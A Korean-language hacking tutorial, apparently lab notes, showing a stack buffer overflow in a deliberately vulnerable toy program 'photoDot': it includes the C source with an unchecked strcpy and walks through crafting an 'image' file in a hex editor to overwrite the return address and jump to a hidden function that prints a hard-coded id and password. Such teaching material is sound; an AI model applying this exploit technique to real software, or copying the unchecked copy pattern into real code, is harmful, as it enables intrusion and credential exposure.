# photoDot 앱 해킹하기

# Attack Vector

잘 조작된 파일이나, 채팅 입력, 패킷 전송 등을 통해서 프로그램 안에서 변화를 일으켜서 해킹할 수 있는 **이상한 데이터**를 넣을 수 있는 곳을 **Attack Vector**(공격 표면)라고 부릅니다

<aside>
💡

photoDot 앱의 Attack Vector 는 image 파일이라고 할 수 있겠습니다

</aside>

단순히 아무 문자나 입력한 이상한 큰 파일말고, 의도적으로 잘 조작된 image 파일을 만들어서 프로그램에 넣으면 Return Address 를 해커가 원하는 값으로 변경해서 해킹할 수 있습니다.

# 이미지 파일 조작하기

우선, 이미지를 아래와 같이 연속되지 않는 알파벳을 길게 적어서, return address 가 정확히 길이부터 덮어쓰기 되는지 확인해봅시다.

image 를 아래와 같이 작성하고 실행해봅시다.

```bash
LoremipsumdolorsitametconsecteturadipiscingelitSeddoeiusmodtemporincididunutlaboreetdoloremagnaaliquaUtenimadminimveniamquisnostrudexercitationullamcolaborisnisialiquipexeacommodoconsequatDuisautiruredolorinreprehenderitinvoluptatevelitessecilumdoloreeufugiatnullapariaturExcepteursintoccaecatcupidatatnonproidentsuntinculpaquiofficiadeseruntmollitanimidestlaborum
```

![image.png](image%20142.png)

(어떤 문자열을 넣었느냐에 따라 다름)

```bash
0x74736f6e73697571
```

라는 주소로 점프하려고 하는걸 볼 수 있습니다.

- 그러나 그런 주소에는 코드가 적혀있지 않기 때문에 점프하지 못하고 에러를 일으키며 종료됩니다.
- **실제로 존재하는 코드의 주소를 적는다면?**

아래 명령어로, image 파일을 헥스에디터로 열어보면,

```bash
apt install hexedit
hexedit image
```

<aside>
💡

hxd, 0x0 editor, binary ninja 등 다른 헥스에디터를 써도 됩니다.

</aside>

- 우리가 적은 알파벳이 ASCII 코드로 적혀있음을 확인할 수 있습니다.
    - ASCII 코드는 알파벳을 컴퓨터에 저장하기 위하여 16진수 숫자로 바꾼 것을 말합니다.

![image.png](image%20143.png)

아래 주소는 컴퓨터 메모리에 저장될 때는 **리틀 엔디안** 형태로 저장되는데,

- 리틀 엔디안 형태란 **16 진수 단위로 끊어서 거꾸로 저장되는 것**을 말합니다.

![image.png](image%20144.png)

<aside>
💡

앞의 0x 는, 이 숫자가 16진수임을 의미합니다.

예를 들어, 0x43 은 16진수로 4*16+3 = 67, 10진수로 67인거임

</aside>

메모리에 저장된 return address 는 이것입니다.

![image.png](image%20142.png)

```
0x74736f6e73697571
```

16진수로 끊어서 읽으면,

```
74 73 6f 6e 73 69 75 71
```

따라서 원래 값은 거꾸로된 값인, 

```
71 75 69 73 6e 6f 73 74
```

즉, 아래 빨간 부분임을 알 수 있습니다.

![image.png](image%20145.png)

이제 저 값을 알아보기 쉬운 다른 문자로 바꿔서 표시해둡니다

<aside>
💡

다른 ASCII 코드를 입력하면 되겠죠

</aside>

![image.png](image%20146.png)

Ctrl + w 를 눌러서 저장한다음 Ctrl + C 로 종료합니다.

다시 실행해보면,

```
gdb ./photoDot
pwndbg> r
```

![image.png](image%20147.png)

우리가 입력한 값이 리틀엔디언 순서로 return address 를 덮어씌운 것을 알 수 있습니다.

```
44 43 42 41 54 53 52 51

리틀엔디안
51 52 53 54 41 42 43 44

붙여쓰고 0x 붙인거
0x5152535441424344
```

성공입니다. 이제 저 위치에 있는 값을 조작하면, 이미지 파일을 통해 아무곳으로나 코드를 점프시킬 수 있습니다.

이제 저 대문자들 뒤에는 걍 지웁시다

![image.png](image%20148.png)

![image.png](image%20149.png)

# 점프할 코드 주소 알아내기

아래 코드를 살펴보면, **수상한 함수**가 있다는 것을 알아차릴 수 있습니다.

```c
// Name: photoDot.c
// Compile: gcc -o photoDot photoDot.c -fno-stack-protector -no-pie -zexecstack

#include <stdio.h>
#include <string.h>

void dotty(char* mem){
    char filter[100];

    strcpy(filter,mem);

    int i;
    for(i = 0; i < 100; i++) {
      
      if(filter[i]=='\0'){
        break;
      }

      if(filter[i] != '\x20' && filter[i] != '\x0A') {
        filter[i] = '.';
      }
      printf("%c",filter[i]);
    }
    printf("\n\n");
    printf("Dot Filter Applied!!\n");
}

void hidden(){
  printf("###########################################\n");
  printf("############# id : Jaeho Jeon #############\n");
  printf("############# pw : qwer1234 ###############\n");
  printf("###########################################\n");
  fflush(stdout);
}

int main(){

    char img_content[200];
      
    printf("Press Enter to read data...\n");

    getchar(); // Wait for Enter key press

    FILE* file = fopen("image","r");

    if(file == NULL) {
        printf("No File!\n");
        return 0;
    }

    fread(img_content, 1, 200, file);
    
    fclose(file);

    dotty(img_content);
    

    printf("App Exit~\n");
      
    return 0;
}
```

바로 이 함수인데, 이 함수는 존재하지만,

main 함수에서 이 함수를 실행하는 코드가 없으므로, **정상적인 방법으로는 절대 실행**되지 않습니다.

- 실제 앱에서도, 로그인을 해야만 볼 수 있어야 한다던가 하는 보안 상 중요한 기능들을 예시로 만든 것 입니다.
- photoDot 앱에서, 이 함수가 실행되버린다면 사용자의 아이디와 비밀번호가 노출될 것 입니다

```c
void hidden(){
  printf("###########################################\n");
  printf("############# id : Jaeho Jeon #############\n");
  printf("############# pw : qwer1234 ###############\n");
  printf("###########################################\n");
  fflush(stdout);
}
```

# 함수 주소 알아내기

hidden 함수를 앱이 실행시키지는 않지만, Stack Overflow 를 통해 Return Address Overwrite 로 hidden 의 주소를 덮으면 **hidden 함수를 강제로 실행**할 수 있을 것입니다.

objdump 라는 툴로 photoDot 실행파일을 디스어셈블해서 hidden 함수의 주소를 알아냅시다

```bash
objdump -d photoDot
```

<aside>
💡

IDA, binary ninja 등의 디스어셈블러를 써도 됩니다.

</aside>

<aside>
💡

gdb 에서 info functions 또는 print hidden 명령어를 입력해도 됨

</aside>

![image.png](image%20150.png)

hidden 함수의 주소는

```bash
0x00000000004012b8
00 00 00 00 00 40 12 b8
```

입니다.

![image.png](image%20151.png)

이 주소로 조작합시다

리틀엔디안으로,

```bash
0x00004012b8

00 00 00 00 00 40 12 b8

뒤집으면,
b8 12 40 00 00 00 00 00 
```

```bash
Ctrl + W, Ctrl + C 로 저장후 종료
```

![image.png](image%20152.png)

<aside>
💡

ASCII 코드랑 매칭되는 알파벳이 없어서 알파벳으로 표시되지는 않습니다.

</aside>

이렇게 생긴 요상한 파일로 조작했습니다.

![image.png](image%20153.png)

실행해보면,

**hidden 함수로 점프합니다.**

- 강제로 id 와 password 가 출력되버립니다

![image.png](image%20154.png)

gdb 가 아니라 그냥 실행해봅시다.

아…. **해킹되어버렸습니다.**

(이미지 파일을 열었을 뿐인데요)

![image.png](image%20155.png)

사실 이미지가 아니라, 그냥 항상 데이터가 오고가는 프로그램이였다면, **사용자가 아무것도 안하고 앱이 켜져있기만해도 해킹 될 수 있습니다.** (Zero Click Attack이라고 부릅니다)